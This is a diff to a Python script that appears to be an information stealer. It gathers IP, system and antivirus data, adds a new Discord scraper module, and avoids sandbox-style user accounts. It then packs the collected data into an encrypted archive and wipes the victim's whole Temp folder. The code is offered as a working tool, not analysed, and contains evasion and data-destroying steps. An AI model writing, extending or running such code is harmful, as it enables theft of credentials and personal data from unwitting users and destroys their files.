@@ -4,14 +4,17 @@ import sys
 import os
 import ctypes
 import getpass
+from zipfile import Path
 import py7zr
 import shutil
 from datetime import datetime
+from pathlib import Path
 
 # Scraper'ları import et
 import utils.ipdata as ipdata
 import utils.msinfo as msinfo
 import utils.antivirus as antivirus
+import utils.discord as discord
 
 blacklistUsers = ['WDAGUtilityAccount', 'test', 'Guest', 'DefaultAccount']
 
@@ -79,7 +82,7 @@ def run_scraper(func):
 def zip_temp_folder():
     """Temp klasöründeki lunix klasörünü şifreli olarak ziple ve orjinal klasörü sil"""
     global temp_path
-    temp_path = os.path.expandvars(r"%temp%\lunix")
+    temp_path = os.path.expandvars(rf"C:\Users\{username}\AppData\Local\Temp")
     if not os.path.exists(temp_path):
         return
         
@@ -103,10 +106,18 @@ def main():
     ipdata_result = run_scraper(ipdata.run_ipdata)
     msinfo_result = run_scraper(msinfo.run_msinfo_scraper)
     antivirus_result = run_scraper(antivirus.main(folders_to_scan=antivirus_folders, clear_logs=True, max_dirs_per_root=None))
+    discord_result = run_scraper(discord.main)
     time.sleep(2)
 
     # Bütün işlemler bittikten sonra klasörü ziple
     zip_temp_folder()
+    
+    # Temp klasörünü temizle
+    for f in Path(rf"C:\Users\{username}\AppData\Local\Temp").iterdir():
+        if f.is_dir():
+            shutil.rmtree(f, ignore_errors=True)
+        else:
+            f.unlink(missing_ok=True)
 
 if __name__ == "__main__":
     main()
